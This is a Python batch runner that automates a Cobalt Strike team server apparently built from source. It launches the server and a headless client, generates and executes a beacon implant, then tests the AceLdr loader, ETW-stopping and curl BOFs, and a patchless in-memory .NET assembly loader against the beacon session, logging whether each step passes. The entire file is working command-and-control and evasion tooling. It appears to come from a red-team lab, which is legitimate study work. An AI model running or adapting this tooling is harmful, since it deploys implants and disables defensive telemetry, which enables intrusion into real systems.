# -*- coding: utf-8 -*-
"""r2_batch.py - R2 batch runner: boots TS+headless, fresh beacon, then runs
the remaining R2 tests in sequence:
  R2-2 deploy: aceldr (AceLdr loader + our payload -> bdll_spawn)
  R2-3: ajpc500/BOFs smoke (etw stop, curl)
  R2-5: PatchlessIEA dispatch (isolate patch vs CLR for test-3 crash)
Logs everything to r2_batch.log; each test gated independently."""
import os
import re
import subprocess
import sys
import time
from pathlib import Path

P3 = r"C:\Users\Administrator\Desktop\cobaltstrike\cobaltstrike-ts\p3-llvm-bench"
TSBOOT = P3 + r"\tsboot_run"
LOG = TSBOOT + r"\r1.log"
JDK = r"C:\Users\Administrator\Desktop\jdk-21.0.12.1\bin"
JAR = P3 + r"\build\libs\cs-gradle-4.9.1-SNAPSHOT-all.jar"
OUT = open(r"C:\Users\Public\r2_batch.log", "w", encoding="utf-8")


def log(m):
    OUT.write("[%s] %s\n" % (time.strftime("%H:%M:%S"), m))
    OUT.flush()
    print(m, flush=True)


def main():
    # 0. clean state
    subprocess.run(["powershell", "-NoProfile", "-Command",
                    'Get-CimInstance Win32_Process -Filter "name=\'java.exe\' or name=\'javaw.exe\' or name=\'franken_b1.exe\'" | '
                    'ForEach-Object { Stop-Process -Id $_.ProcessId -Force }'], capture_output=True)
    time.sleep(4)
    for f in (TSBOOT + r"\r1_inbox.txt", TSBOOT + r"\r1_ack.txt"):
        if os.path.exists(f):
            os.remove(f)

    # 1. TS + headless
    subprocess.Popen([JDK + r"\java.exe",
                      "--add-opens=java.base/sun.net.www.protocol.https=ALL-UNNAMED",
                      "--add-opens=java.base/sun.net.www.protocol.http=ALL-UNNAMED",
                      "--add-opens=java.base/java.net=ALL-UNNAMED",
                      "-Xmx2g", "-XX:+AggressiveHeap", "-XX:+UseParallelGC",
                      "-Djavax.net.ssl.keyStore=cobaltstrike.store",
                      "-Djavax.net.ssl.keyStorePassword=123456",
                      "-cp", JAR, "server.TeamServer", "192.168.100.200", "franken", "r2_inj_tpd.profile"],
                     cwd=TSBOOT)
    time.sleep(12)
    subprocess.Popen([JDK + r"\javaw.exe",
                      "--add-opens=java.base/sun.net.www.protocol.https=ALL-UNNAMED",
                      "--add-opens=java.base/sun.net.www.protocol.http=ALL-UNNAMED",
                      "--add-opens=java.base/java.net=ALL-UNNAMED",
                      "-Xmx512m", "-cp", JAR,
                      "aggressor.headless.Start", "192.168.100.200", "50050", "franken-opR2", "franken",
                      "headless_franken.cna"],
                     cwd=TSBOOT)
    deadline = time.time() + 120
    while time.time() < deadline:
        if "READY" in open(LOG, encoding="utf-8", errors="replace").read()[-400:]:
            break
        time.sleep(3)
    log("TS ready")

    sys.path.insert(0, TSBOOT)
    from tier3_common import send

    # 2. fresh beacon
    exe = Path(r"C:\Users\Public\franken_b1.exe")
    if exe.exists():
        exe.unlink()
    send("artifact", "vnc-http", "exe", "x64", str(exe).replace("\\", "/"))
    t0 = time.time()
    while not (exe.exists() and exe.stat().st_size > 300000) and time.time() - t0 < 120:
        time.sleep(2)
    log("exe: %d B" % (exe.stat().st_size if exe.exists() else 0))
    if not exe.exists():
        log("ABORT: no exe")
        return
    seen = set(re.findall(r"INITIAL\t(\d+)", open(LOG, encoding="utf-8", errors="replace").read()))
    subprocess.Popen([str(exe)], cwd=r"C:\Users\Public",
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    bid = None
    deadline = time.time() + 180
    while time.time() < deadline:
        m = re.findall(r"INITIAL\t(\d+)", open(LOG, encoding="utf-8", errors="replace").read())
        new = [x for x in m if x not in seen]
        if new:
            bid = new[-1]
            break
        time.sleep(5)
    log("beacon bid: %s" % (bid or "NONE"))
    if not bid:
        log("ABORT: no beacon")
        return
    send("target", bid)
    time.sleep(2)

    # ============ R2-2 deploy: aceldr ============
    log("=== R2-2 aceldr deploy ===")
    p = len(open(LOG, encoding="utf-8", errors="replace").read())
    send("aceldr", "vnc-http")
    time.sleep(10)
    time.sleep(60)
    seg = open(LOG, encoding="utf-8", errors="replace").read()[p:]
    aceldr_init = re.findall(r"INITIAL\t(\d+)", seg)
    log("aceldr new INITIAL: %s" % (aceldr_init or "none"))
    log("aceldr ALT/pwd: %s" % bool(re.search(r"ALT\t\d+\t.*[Cc]urrent", seg)))
    log("R2-2: %s" % ("PASS" if aceldr_init else "LOAD-FAIL (documented)"))
    # re-target original beacon for the rest
    send("target", bid)
    time.sleep(2)

    # ============ R2-3: ajpc500/BOFs smoke ============
    log("=== R2-3 ajpc500 BOFs smoke ===")
    bofs_dir = Path(r"C:\Users\Public\ajpc_bofs")
    if bofs_dir.exists():
        p = len(open(LOG, encoding="utf-8", errors="replace").read())
        for o in sorted(bofs_dir.glob("*.x64.o")):
            send("inline_execute", str(o).replace("\\", "/"), "go")
            time.sleep(5)
        time.sleep(30)
        seg = open(LOG, encoding="utf-8", errors="replace").read()[p:]
        outs = re.findall(r"received output:n([^\n]{0,90})", seg)
        log("ajpc outputs: %d" % len(outs))
        for o in outs[:16]:
            log("  | %s" % o)
    else:
        log("ajpc BOFs not cloned yet - skip (build separately)")

    # ============ R2-5: PatchlessIEA ============
    log("=== R2-5 PatchlessIEA ===")
    piea = Path(r"C:\Users\Public\patchless_iea.x64.o")
    if piea.exists():
        p = len(open(LOG, encoding="utf-8", errors="replace").read())
        # same ziiiiizzzib contract as IEA
        import base64
        exe_bytes = open(r"C:\Users\Public\TestAssembly.exe", "rb").read()
        sys.path.insert(0, TSBOOT)
        # dispatch via cna iea-equivalent: reuse inline_execute path won't carry
        # the 10-arg blob; use dedicated cna command if present
        send("piea", str(piea).replace("\\", "/"),
             r"C:/Users/Public/TestAssembly.exe", "patchless test")
        time.sleep(10)
        time.sleep(50)
        seg = open(LOG, encoding="utf-8", errors="replace").read()[p:]
        log("piea IEA-TEST: %s" % bool(re.search(r"IEA-TEST-OK", seg)))
        log("piea beacon alive: %s" % ("HEART\t" + bid + "\talive=true" in
                                       open(LOG, encoding="utf-8", errors="replace").read()[-3000:]))
    else:
        log("patchless_iea.x64.o not built yet - skip")

    # beacon final alive check
    time.sleep(30)
    seg = open(LOG, encoding="utf-8", errors="replace").read()[-3000:]
    log("final beacon alive: %s" % ("HEART\t" + bid + "\talive=true" in seg))
    log("R2 BATCH DONE")


if __name__ == "__main__":
    try:
        main()
    finally:
        OUT.close()
